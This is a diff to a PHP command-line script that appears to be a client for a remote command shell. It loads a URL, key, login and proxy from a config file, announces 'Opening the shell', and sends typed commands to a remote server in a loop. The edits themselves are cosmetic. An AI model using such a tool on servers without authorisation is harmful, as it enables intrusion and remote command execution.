@@ -19,7 +19,6 @@ if (!is_readable($file)) {
     exit(-1);
 }
 
-// Read our config file
 $config = json_decode(file_get_contents($file), true);
 if (!is_json_valid($config)) {
     echo "\n [-] That config file is not valid! (╯°□°)╯︵ ┻━┻\n\n";
@@ -27,19 +26,18 @@ if (!is_json_valid($config)) {
 }
 echo " [+] The json file is valid.\n";
 
-$key      = trim($config['key']);
-$url      = trim($config['url']);
-$login    = trim($config['login']['username']);
-$password = trim($config['login']['password']);
-$proxy    = array();
+$key      = $config['key'];
+$url      = $config['url'];
+$login    = $config['login']['username'];
+$password = $config['login']['password'];
 
+$proxy    = array();
 if (isset($config['proxy'])) {
     echo " [+] We're going to use a proxy.\n";
     $proxy = $config['proxy'];
 }
 
 $cookies = null;
-
 if (isset($config['cookies'])) {
     $cookies = $config['cookies'];
 }
@@ -54,8 +52,6 @@ $time        = '';
 $ip          = '';
 $client_ip   = '';
 $tools       = array();
-
-$continue = false;
 
 echo " [+] Trying to connect... ";
 
@@ -93,7 +89,7 @@ echo " [+] Opening the shell... \n";
 
 sleep(1);
 
-print_banner();
+print_cool_banner();
 
 echo "\n";
 echo "\e[37mServer IP\t:=\e[0m \e[97m{$ip}\e[0m\t\n\e[37mClient IP\t:=\e[0m \e[97m{$client_ip}\e[0m\n";
@@ -105,10 +101,7 @@ echo "\n";
 do {
     $prefix = "\e[91m{$username}\e[0m@\e[33m{$hostname}\e[0m:\e[94m{$path}\e[0m$ ";
     $line   = readline($prefix);
-    $cmd    = trim(str_replace(array(
-        "\n",
-        "\r"
-    ), '', $line));
+    $cmd    = trim(str_replace(array("\n", "\r"), '', $line));
     if ($cmd != 'exit' && strlen($cmd) > 0) {
         $data = make_request($cmd, $path, $key);
         if (!isset($data['c']) && !isset($data['f'])) {
